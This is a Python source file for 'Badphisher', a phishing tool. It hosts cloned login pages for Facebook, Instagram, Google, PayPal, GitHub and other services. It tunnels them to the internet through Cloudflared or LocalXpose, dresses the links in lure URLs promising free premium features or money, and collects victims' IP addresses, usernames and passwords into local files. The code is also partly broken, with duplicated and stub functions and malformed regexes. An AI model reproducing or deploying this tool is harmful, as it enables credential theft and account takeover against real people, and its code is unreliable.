import sys
import os
import shutil
import time
import subprocess
import requests
import tarfile
import zipfile
import platform
import signal
import re

global website, mask

HOST = '127.0.0.1'
PORT = '8080'

RED = '\u001B[31m'
GREEN = '\u001B[32m'
ORANGE = '\u001B[33m'
BLUE = '\u001B[34m'
MAGENTA = '\u001B[35m'
CYAN = '\u001B[36m'
WHITE = '\u001B[37m'
BLACK = '\u001B[30m'
REDBG = '\u001B[41m'
GREENBG = '\u001B[42m'
ORANGEBG = '\u001B[43m'
BLUEBG = '\u001B[44m'
MAGENTABG = '\u001B[45m'
CYANBG = '\u001B[46m'
WHITEBG = '\u001B[47m'
BLACKBG = '\u001B[40m'
RESET = '\u001B[0m'

# Directories
BASE_DIR = os.path.realpath(os.path.dirname(__file__))

# Create directory paths
server_dir = os.path.join(BASE_DIR, ".server")
auth_dir = os.path.join(BASE_DIR, "auth")
www_dir = os.path.join(server_dir, "www")

# Create server_dir if it doesn't exist
if not os.path.exists(server_dir):
    os.makedirs(server_dir)

# Create auth_dir if it doesn't exist
if not os.path.exists(auth_dir):
    os.makedirs(auth_dir)

# Remove www directory if it exists & recreate it
if os.path.exists(www_dir):
    shutil.rmtree(www_dir)
os.makedirs(www_dir)

# Remove logfile
logfile_loclx = os.path.join(server_dir, ".loclx")
logfile_cld = os.path.join(server_dir, ".cld.log")

for logfile in [logfile_loclx, logfile_cld]:
    if os.path.exists(logfile):
        os.remove(logfile)

def exit_on_signal(signum, frame):
    if signum == signal.SIGINT:
        print(f"\n\n{RED}[{RED}!{RED}] {RED} Program Interrupted!")

    elif signum == signal.SIGTERM:
        print(f"\n\n{RED}[{RED}!{RED}]{RED} Program Terminated!")

    sys.exit(0)

# Setup signal handlers
signal.signal(signal.SIGINT, exit_on_signal)
signal.signal(signal.SIGTERM, exit_on_signal)

def kill_pid():
    check_pid = ["php", "cloudflared", "loclx"]

    for process in check_pid:
        try:
            pid = subprocess.check_output(["pidof", process]).strip()
            if pid:
                subprocess.run(["killall", process], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            pass

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def is_command_available(command):
    return subprocess.call(["command", "-v", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def install_with_package_manager(package):
    package_managers = {
        "pkg": ["pkg", "install", package, "-y"],
        "apt": ["sudo", "apt", "install", package, "-y"],
        "apt-get": ["sudo", "apt-get", "install", package, "-y"],
        "pacman": ["sudo", "pacman", "-S", package, "--noconfirm"],
        "dnf": ["sudo", "dnf", "-y", "install", package],
        "yum": ["sudo", "yum", "-y", "install", package]
    }

    for manager, command in package_managers.items():
        if is_command_available(manager):
            subprocess.run(command, check=True)
            return

    print(f"[!] Unsupported package manager. Install packages manually.")
    sys.exit(1)


def install_cloudflared():
    if os.path.exists(".server/cloudflared"):                                                                                                                                            print(f"[+] Cloudflared already installed.")
    else:
        print(f"[+] Installing cloudflared...")
        arch = platform.machine()

        if 'arm' in arch.lower() or 'Android' in arch:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm', 'cloudflired')
        elif arch == 'aarch64':
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64', 'cloudflared')
        elif arch == 'x86_64':
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', 'cloudflared')
        else:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386', 'cloudflared')

def install_localxpose():
    if os.path.exists(".server/loclx"):
        print("[+] LocalXpose already installed.")
    else:
        print("[+] Installing LocalXpose...")
        arch = platform.machine()

        if 'arm' in arch.lower() or 'Android' in arch:
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip', 'loclx')
        elif arch == 'aarch64':
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip', 'loclx')
        elif arch == 'x86_64':
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip', 'loclx')
        else:
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip', 'loclx')
                                                                                                                                                                                 

def banner():
    print(f"{RED}°|========================={BLUE}Badphisher{RED}=========================|°")

def msg_exit():
    clear_console()
    banner()
    print("Thanks for using my tool...Have a good day!")
    sys.exit(0)
PORT = 8080

def choose_custom_port():
    global PORT
    print()
    P_ANS = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Do You Want A Custom Port {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}").strip().lower()

    if P_ANS == 'y':
        print("")
        CU_P = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Enter Your Custom 4-digit Port [1024-9999]: {WHITE}")

        if CU_P.isdigit() and len(CU_P) == 4 and 1024 <= int(CU_P) <= 9999:
            PORT = int(CU_P)
            print()
        else:
            print(f"{RED}[{WHITE}!{RED}] {RED}Invalid 4-digit port: {CU_P} Try again...{WHITE}")
            time.sleep(2)
            clear_console()
            banner_small()
            choose_custom_port()

    else:
        print(f"{RED}[{WHITE}-{RED}]{BLUE} Using default port {PORT}...{WHITE}")

def setup_site(website, host):
    print(f"{RED}[{WHITE}-{RED}]{CYAN} Setting up server...{WHITE}")

    subprocess.run(['cp', '-r', f'.sites/{website}/.', '.server/www/'], check=False)
    subprocess.run(['cp', '-f', '.sites/ip.php', '.server/www/'], check=False)

    print(f"{RED}[{WHITE}-{RED}]{CYAN} Starting PHP server...{WHITE}")

    os.chdir('.server/www')
    subprocess.Popen(['php', '-S', f'{host}:{PORT}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

#capture ip
def capture_ip():
    try:
        with open('.server/www/ip.txt', 'r') as ip_file:
            ip_data = ip_file.read()
            ip_match = re.search(r'IP: (S+)', ip_data)

            if ip_match:
                ip = ip_match.group(1).strip()
                print(f"{RED}[{WHITE}-{RED}]{GREEN} Victim's IP: {CYAN}{ip}")
                print(f"{RED}[{WHITE}-{RED}]{GREEN} Saved in: {ORANGE}auth/ip.txt")

                with open('auth/ip.txt', 'a') as auth_ip_file:
                    auth_ip_file.write(ip + '')
            else:
                print(f"{RED}[{WHITE}!{RED}]{MAGENTA} No IP found in .server/www/ip.txt")

    except FileNotFoundError:
        print(f"{RED}[{WHITE}!{RED}]{MAGENTA} File not found: .server/www/ip.txt")
#capture credentials
def capture_creds():
    try:
        with open('.server/www/usernames.txt', 'r') as creds_file:
            creds_data = creds_file.read()

            account_match = re.search(r'Username:s*(S+)', creds_data)
            password_match = re.search(r'Pass:s*(S+)', creds_data)

            if account_match and password_match:
                account = account_match.group(1).strip()
                password = password_match.group(1).strip()

                print(f"{RED}[{WHITE}-{RED}]{GREEN} Account: {CYAN}{account}")
                print(f"{RED}[{WHITE}-{RED}]{GREEN} Password: {CYAN}{password}")
                print(f"{RED}[{WHITE}-{RED}]{GREEN} Saved in: {CYAN}auth/usernames.dat")

                with open('auth/usernames.dat', 'a') as auth_creds_file:
                    auth_creds_file.write(f"Username: {account}, Password: {password}")

                print(f"{RED}[{WHITE}-{RED}]{ORANGE} Waiting for next login info, {CYAN} Ctrl + C {ORANGE} to exit")

            else:
                print(f"{RED}[{WHITE}-{RED}]{WHITE} No credentials found in .server/www/usernames.txt")

    except FileNotFoundError:
        print(f"{RED}[{WHITE}!{RED}]{MAGENTA} File not found: .server/www/usernames.txt")

HOST = "127.0.0.1"
PORT = 8080


#capture data
def capture_data():
    print(f"{RED}[{WHITE}+{RED}]{ORANGE} Waiting for Login info {CYAN} Ctrl + C {ORANGE} to exit...")

    while True:
        if os.path.exists(".server/www/ip.txt"):
            print(f"{RED}[{WHITE}-{RED}]{GREEN} Victim's IP found !!")
            capture_ip()
            os.remove(".server/www/ip.txt")

        time.sleep(0.75)

        if os.path.exists(".server/www/usernames.txt"):
            print(f"{RED}[{WHITE}-{RED}]{GREEN} Login info found !!")
            capture_creds()
            os.remove(".server/www/usernames.txt")

        time.sleep(0.75)

def start_cloudflared():
    try:
        cld_log = os.path.join(".server", ".cld.log")
        if os.path.exists(cld_log):
            os.remove(cld_log)

        print(f"{RED}[{WHITE}-{RED}]{GREEN} Initializing...{GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
        time.sleep(1)

        print(f"{RED}[{WHITE}-{RED}]{GREEN} Launching Cloudflared...")
        command = f"./.server/cloudflared tunnel -url {HOST}:{PORT} --logfile .server/.cld.log"

        if subprocess.run(["command", "-v", "termux-chroot"], stdout=subprocess.PIPE).returncode == 0:
            command = f"termux-chroot {command}"

        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(8)
        with open(".server/.cld.log", "r") as log_file:
            cldflr_url_match = re.search(r'https://[^s]+', log_file.read())
            if cldflr_url_match:
                cldflr_url = cldflr_url_match.group(0)
                custom_url(cldflr_url)
                capture_data()
            else:
                print(f"{RED}[{WHITE}!{RED}]{MAGENTA} Could not extract Cloudflared URL from log")

    except Exception as e:
        print(f"{RED}[{WHITE}!{RED}]{MAGENTA} Error starting Cloudflared: {e}")

def localxpose_auth():
    subprocess.Popen(["./.server/loclx", "-help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    auth_f = ".localxpose/.access" if os.path.isdir(".localxpose") else os.path.join(os.path.expanduser("~"), ".localxpose", ".access")

    try:
        result = subprocess.run(["./.server/loclx", "account", "status"], capture_output=True, text=True)
        if "Error" in result.stdout:
            print(f"{RED}[{WHITE}!{RED}]{GREEN} Create an account on {ORANGE}localxpose.io{GREEN} & copy the token")
            time.sleep(3)
            loclx_token = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Input Localx Token: {ORANGE}").strip()

            if loclx_token == "":
                print(f"{RED}[{WHITE}!{RED}]{RED} You have to input Localxpose Token.")
                time.sleep(2)
                tunnel_menu()

            else:
                with open(auth_f, "w") as auth_file:
                    auth_file.write(loclx_token)

    except Exception as e:
        print(f"{RED}[{WHITE}!{RED}]{MAGENTA} Error during Localxpose authentication: {e}")

def cusport():
    pass

def setup_site():
    pass

def custom_url(loclx_url):
    print(f"{RED}[{WHITE}!{RED}]{GREEN} Localxpose URL: {CYAN}{loclx_url}{RESET}")

def capture_data():
    print(f"{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE} to exit...")
    while True:
        if os.path.exists(".server/www/ip.txt"):
            print(f"{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found!")
            capture_ip()
            os.remove(".server/www/ip.txt")

        time.sleep(0.75)

        if os.path.exists(".server/www/usernames.txt"):
            print(f"{RED}[{WHITE}-{RED}]{GREEN} Login info Found!!")
            capture_creds()
            os.remove(".server/www/usernames.txt")

        time.sleep(0.75)

def start_loclx():
    cusport()
    print(f"{RED}[{WHITE}-{RED}]{GREEN} Initializing...{GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
    time.sleep(1)

    opinion = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Change Loclx Server Region? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}").strip().lower()
    loclx_region = "eu" if opinion == "y" else "us"

    print(f"{RED}[{WHITE}-{RED}]{GREEN} Launching LocalXpose...")

    # Validate HOST and PORT before use
    host = str(HOST).strip()
    port = str(PORT).strip()
    if not re.match(r'^[a-zA-Z0-9.-]+$', host) or not re.match(r'^d+$', port):
        print(f"{RED}[!] Invalid HOST or PORT. Aborting.")
        return

    command = [
        "./.server/loclx", "tunnel", "--raw-mode", "http",
        "--region", loclx_region,
        "--https-redirect",
        "-t", f"{host}:{port}"
    ]

    if shutil.which("termux-chroot"):
        command = ["termux-chroot"] + command

    loclx_file_path = ".server/.loclx"

    try:
        with open(loclx_file_path, "w") as loclx_file:
            process = subprocess.Popen(
                command,
                stdout=loclx_file,
                stderr=subprocess.STDOUT
            )
    except OSError as e:
        print(f"{RED}[!] Failed to launch LocalXpose: {e}")
        return

    # Wait for URL with retry loop instead of fixed sleep
    loclx_url = None
    timeout = 30
    interval = 2

    for _ in range(timeout // interval):
        time.sleep(interval)

        # Check if process crashed
        if process.poll() is not None:
            print(f"{RED}[!] LocalXpose process exited unexpectedly (code {process.returncode}).")
            break

        try:
            with open(loclx_file_path, "r") as loclx_file:
                loclx_data = loclx_file.read()
        except OSError as e:
            print(f"{RED}[!] Could not read tunnel output: {e}")
            break

        match = re.search(r'\b[0-9a-zA-Z.-]+.loclx.io\b', loclx_data)
        if match:
            loclx_url = match.group(0)
            break

    if loclx_url:
        print(f"{GREEN}[+] Tunnel URL: {CYAN}{loclx_url}")
        custom_url(loclx_url)
        capture_data()
    else:
        print(f"{RED}[!] Failed to retrieve LocalXpose URL. Check {loclx_file_path} for details.")
        process.terminate()
def start_localhost():
    """Start localhost server."""
    cusport()
    print(f"{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")

    setup_site()

    time.sleep(1)
    os.system('clear')
    print(f"{RED}[{WHITE}-{RED}]{GREEN} Successfully Hosted at: {CYAN}http://{HOST}:{PORT}{RESET}")

    capture_data()

def tunnel_menu():
    clear_console()
    banner()

    print(f"""
    {RED}[{WHITE}01{RED}]{ORANGE} localhost
    {RED}[{WHITE}02{RED}]{ORANGE} Cloudflared {RED}[{CYAN}Auto detects{RED}]
    {RED}[{WHITE}03{RED}]{ORANGE} Localxpose {RED}[{CYAN}NEW! Max 15min{RED}]
    """)

    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select a port forwarding service: {BLUE}")

    if reply in ('1', '01'):
        start_localhost()
    elif reply in ('2', '02'):
        start_cloudflared()
    elif reply in ('3', '03'):
        start_loclx()
    else:
        print(f"{RED}[{WHITE}!{RED}]{RED} Invalid option, try again...")
        time.sleep(1)
        tunnel_menu()

def site_stat(url):
    if url:
        try:
            response = requests.head(url, allow_redirects=True)
            return response.status_code
        except requests.RequestException as e:
            print(f"{MAGENTA} Error checking site status: {e}")
            return None

def site_facebook():
    fb_options = [
        ("Traditional login page", 'facebook'),
        ("Advanced voting poll login", 'fb_advaced'),
        ("Fake security login page", 'fb_security'),
        ("Facebook messenger login page", 'fb_messenger')
    ]

    print(f"{RED}[{WHITE}-{RED}]{ORANGE} Select an option: {GREEN}")

    for i, (name, code) in enumerate(fb_options, 1):
        print(f"{RED}[{WHITE}{i}{RED}]{ORANGE} {name}")

    reply = input(f"{RED}>>>{ORANGE} Select an option: {GREEN}").strip()
    clear_console()

    if reply == '1':
        website = "facebook"
        mask = 'https://blue-verified-badge-for-facebook-free'
        tunnel_menu()
    elif reply == '2':
        website = "fb_advaced"
        mask = 'https://vote-for-the-best-social-media'
        tunnel_menu()
    elif reply == '3':
        website = "fb_security"
        mask = 'https://make-your-facebook-secured-and-free-from-hackers'
        tunnel_menu()
    elif reply == '4':
        website = "fb_messenger"
        mask = 'https://get-messenger-premium-features-free'
        tunnel_menu()
    else:
        print(f"{RED}[{WHITE}!{RED}]{RED} Invalid option!")
        site_facebook()

def site_instagram():
    ig_options = [
        ("Traditional Login Page", 'instagram'),
        ("Auto Followers Login Page", 'ig_followers'),
        ("1000 Followers Login Page", 'insta_followers'),
        ("Blue Badge Verify Login Page", 'ig_verify')
    ]

    print(f"{RED}[{WHITE}-{RED}]{ORANGE} Select an option: {GREEN}")

    for i, (name, code) in enumerate(ig_options, 1):
        print(f"{RED}[{WHITE}{i}{RED}]{ORANGE} {name}")

    reply = input(f"{RED}>>>{ORANGE} Select an option: {GREEN}").strip()
    clear_console()

    if reply == '1':
        website = "instagram"
        mask = 'https://get-unlimited-followers-for-instagram'
        tunnel_menu()
    elif reply == '2':
        website = "ig_followers"
        mask = 'https://get-unlimited-followers-for-instagram'
        tunnel_menu()
    elif reply == '3':
        website = "insta_followers"
        mask = 'https://get-1000-followers-for-instagram'
        tunnel_menu()
    elif reply == '4':
        website = "ig_verify"
        mask = 'https://blue-badge-verify-for-instagram-free'
        tunnel_menu()
    else:
        print(f"{RED}[{WHITE}!{RED}]{RED} Invalid option! try again...")
        clear_console()
        site_instagram()
def site_gmail():
    gmail_options = [
        ("Gmail Old Login Page", 'google'),
        ("Gmail New Login Page", 'google_new'),
        ("Advanced Voting Poll", 'google_poll')
    ]

    print(f"{RED}[{WHITE}-{RED}]{ORANGE} Select an option: {GREEN}")
    for i, (name, code) in enumerate(gmail_options, 1):
        print(f"{RED}[{WHITE}{i}{RED}]{ORANGE} {name}")

    reply = input(f"{RED}>>>{ORANGE} Select an option: {GREEN}").strip()

    if reply == '1':
        website = "google"
        mask = 'https://get-unlimited-google-drive-free'
        tunnel_menu()
    elif reply == '2':
        website = "google_new"
        mask = 'https://get-unlimited-google-drive-free'
        tunnel_menu()
    elif reply == '3':
        website = "google_poll"
        mask = 'https://vote-for-the-best-social-media'
        tunnel_menu()
    else:
        print(f"{RED}[{WHITE}!{RED}]{RED} Invalid option! try again...")
        clear_console()
        site_gmail()

def site_tiktok():
    website = "tiktok"
    mask = 'https://tiktok-free-liker'
    tunnel_menu()

def site_paypal():
    website = "paypal"
    mask = 'https://get-500-usd-free-to-your-account'
    tunnel_menu()

def site_microsoft():
    website = "microsoft"
    mask = 'https://unlimited-onedrive-space-for-free'
    tunnel_menu()

def site_netflix():
    website = "netflix"
    mask = 'https://upgrade-your-netflix-plan-free'
    tunnel_menu()
def site_twitter():
    website = "twitter"
    mask = 'https://get-blue-badge-on-twitter-free'
    tunnel_menu()

def site_pinterest():
    website = "pinterest"
    mask = 'https://get-a-premium-plan-for-pinterest-free'
    tunnel_menu()

def site_snapchat():
    website = "snapchat"
    mask = 'https://view-locked-snapchat-accounts-secretly'
    tunnel_menu()

def site_linkedin():
    website = "linkedin"
    mask = 'https://get-a-premium-plan-for-linkedin-free'
    tunnel_menu()

def site_protonmail():
    website = "protonmail"
    mask = 'https://protonmail-pro-basics-for-free'
    tunnel_menu()

def site_spotify():
    website = "spotify"
    mask = 'https://convert-your-account-to-spotify-premium'
    tunnel_menu()

def site_reddit():
    website = "reddit"
    mask = 'https://reddit-official-verified-member-badge'
    tunnel_menu()

def site_github():
    website = "github"
    mask = 'https://get-1k-followers-on-github-free'
    tunnel_menu()

def site_discord():
    website = "discord"
    mask = 'https://get-discord-nitro-free'
    tunnel_menu()

def site_adobe():
    website = "adobe"
    mask = 'https://get-adobe-lifetime-pro-membership-free'
    tunnel_menu()

def site_stackoverflow():
    website = "stackoverflow"
    mask = 'https://get-stackoverflow-lifetime-pro-membership-free'
    tunnel_menu()

def about():
    print("https://github.com/Bereket635")

def msg_exit():
    clear_console()
    banner()
    print("Thanks for using my tool... Have a good day!")
    sys.exit(0)

def main_menu():
    clear_console()
    banner()
    print()

    menu_options = [
        ("Facebook", "01"),
        ("Instagram", "02"),
        ("Google", "03"),
        ("TikTok", "04"),
        ("Paypal", "05"),
        ("Microsoft", "06"),
        ("Netflix", "07"),
        ("Twitter", "08"),
        ("Pinterest", "09"),
        ("Snapchat", "10"),
        ("Linkedin", "11"),
        ("Protonmail", "12"),
        ("Spotify", "13"),
        ("Reddit", "14"),
        ("GitHub", "15"),
        ("Discord", "16"),
        ("Adobe", "17"),
        ("Stackoverflow", "18")
    ]

    print(f"{RED}[{WHITE}${RED}]{CYAN}Select an attack for your victim: {RED}[{WHITE}${RED}] ")

    # Print options in 2 columns (9 per row = 18 total, so 2 rows of 9)
    for i, (name, code) in enumerate(menu_options, 1):
        print(f"{RED}[{WHITE}{code}{RED}]{ORANGE} {name}", end="")
        if i % 1 == 0:
            print()  # Newline after every 9 options
        else:
            print("  ", end="")  # Space between options on same line

    print(f"{RED}[{WHITE}88{RED}]{CYAN} About          {RED}[{WHITE}00{RED}]{CYAN} Exit")

    reply = input(f"{RED}>>>{ORANGE} Select an option: {GREEN}").strip()
    clear_console()
    banner()

    reply = reply.lstrip("0")
    if reply == '1':
        site_facebook()
    elif reply == '2':
        site_instagram()
    elif reply == '3':
        site_gmail()
    elif reply == '4':
        site_tiktok()
    elif reply == '5':
        site_paypal()
    elif reply == '6':
        site_microsoft()
    elif reply == '7':
        site_netflix()
    elif reply == '8':
        site_twitter()
    elif reply == '9':
        site_pinterest()
    elif reply == '10':
        site_snapchat()
    elif reply == '11':
        site_linkedin()
    elif reply == '12':
        site_protonmail()
    elif reply == '13':
        site_spotify()
    elif reply == '14':
        site_reddit()
    elif reply == '15':
        site_github()
    elif reply == '16':
        site_discord()
    elif reply == '17':
        site_adobe()
    elif reply == '18':
        site_stackoverflow()
    elif reply == '88':
        about()
    elif reply == '00':
        msg_exit()
    else:
        print(f"{RED}[{WHITE}!{RED}]{RED} Invalid option! try again...")
        time.sleep(2)
        clear_console()
        banner()
        main_menu()


kill_pid()
main_menu()